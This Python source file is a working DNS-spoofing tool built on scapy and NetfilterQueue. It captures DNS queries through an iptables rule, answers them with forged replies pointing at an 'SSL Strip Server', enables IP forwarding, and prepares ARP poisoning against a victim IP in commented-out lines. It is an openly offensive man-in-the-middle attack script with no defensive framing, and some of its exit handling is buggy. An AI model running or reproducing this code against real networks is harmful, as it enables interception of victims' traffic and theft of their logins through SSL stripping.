# coding=utf-8
import os
import re
import signal

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP

from cleaner import cleaner

from arpspoof import ARP
from multiprocessing import Process

from netfilterqueue import NetfilterQueue

import atexit

StripServer_IP = '192.168.0.6'  # SSL Strip Server Address

os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')


def spoof_callback(data):
    payload = data.get_payload()
    pkt = IP(payload)

    if not pkt.haslayer(DNSQR):
        data.accept()
    else:
        host = pkt[DNS].qd.qname
        print "Detect DNS query %s" % host
        spoofed_pkt = \
            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(
                    rrname=host,
                    ttl=10,
                    rdata=StripServer_IP
                )
            )
        print "Spoof %s to me!" % host
        data.set_payload(str(spoofed_pkt))
        data.accept()


def normal_callback(data):
    payload = data.get_payload()
    pkt = IP(payload)

    if not pkt.haslayer(DNSQR):
        data.accept()
    else:
        host = pkt[DNS].qd.qname
        print "Detect DNS query %s" % host

        res = sr1(IP(dst="168.126.63.1") / UDP() / DNS(rd=1, qd=DNSQR(qname=host)))

        normal_pkt = \
            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / res[DNS]

        normal_pkt = \
            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=res[DNS].qd,
                an=res[DNS].an
            )

        print "%s is resolved!" % host
        data.set_payload(str(normal_pkt))
        data.accept()


def run_arp(victim_ip):
    arp = ARP(victim_ip)
    arp.run()


def exit_handler(queue):
    queue.unbind()
    # process.join()  # Escape ARP loop
    cleaner()
    print("Successfully")


def main():
    # 정상적인 DNS 서버 역할의 경우, DNS_Spoofing = False
    DNSSpoofing = False

    q = NetfilterQueue()
    if DNSSpoofing:
        q.bind(1, spoof_callback)
    else:
        q.bind(1, normal_callback)

    # victim_ip = '192.168.0.39'

    # arp_process = Process(target=run_arp, args=(victim_ip,))

    try:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        # arp_process.start()  # ARP Sub loop
        q.run()  # Main loop
    except KeyboardInterrupt:
        # exit_handler(q, arp_process)
        pass
    signal.signal(signal.SIGTERM, exit_handler(q))
    atexit.register(exit_handler)


if __name__ == '__main__':
    main()
